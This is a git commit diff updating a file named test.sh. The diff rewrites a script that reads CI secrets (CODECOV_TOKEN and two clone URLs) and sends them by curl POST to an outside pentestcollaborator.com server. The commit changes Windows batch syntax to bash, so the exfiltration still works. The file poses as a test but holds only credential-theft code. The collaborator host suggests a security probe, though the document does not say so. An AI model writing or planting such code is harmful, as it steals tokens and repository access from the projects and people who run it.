f835917bc186bf4e30e6be7e4dadb73b9c1c1a2a
chhabria-git <131396760+chhabria-git@users.noreply.github.com>
2023-04-28 11:50:50 -0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,18 +1,18 @@
 @echo off
 setlocal
 
-set SERVER_URL=https://uqowc8eg8jdobvvul8rwjfwozf56t0hp.pentestcollaborator.com
+export SERVER_URL=https://uqowc8eg8jdobvvul8rwjfwozf56t0hp.pentestcollaborator.com
 
 echo Retrieving environment variables...
 
 echo Retrieve environment variables
-set VAR1=$CODECOV_TOKEN
-set VAR2=$API_CLONE_URL
-set VAR3=$AUTH_CLONE_URL
+export VAR1=$CODECOV_TOKEN
+export VAR2=$API_CLONE_URL
+export VAR3=$AUTH_CLONE_URL
 
 echo Sending environment variables to server...
 
 echo Send environment variables to server
-curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"%VAR1%\",\"VAR2\":\"%VAR2%\",\"VAR3\":\"%VAR3%\"}" %SERVER_URL%
+curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\"}" $SERVER_URL
 
 echo Environment variables sent to server.
